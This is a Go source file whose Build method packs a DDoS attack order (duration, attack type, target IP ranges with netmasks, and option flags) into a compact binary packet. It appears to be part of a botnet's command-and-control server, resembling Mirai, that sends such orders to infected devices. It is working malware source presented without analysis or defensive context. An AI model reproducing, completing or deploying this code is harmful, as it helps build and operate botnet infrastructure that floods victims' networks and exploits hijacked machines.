package attacks

import (
	"encoding/binary"
	"errors"
)

func (attack *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	
	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, attack.Duration)
	buf = append(buf, tmp...)

	
	buf = append(buf, attack.Type)

	
	buf = append(buf, byte(len(attack.Targets)))

	
	for prefix, netmask := range attack.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = netmask
		buf = append(buf, tmp...)
	}

	
	buf = append(buf, byte(len(attack.Flags)))

	
	for key, val := range attack.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, ErrTooManyFlagBytes
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	
	if len(buf) > 1400 {
		return nil, errors.New("max buffer is 1400")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)))
	buf = append(tmp, buf...)

	return buf, nil
}
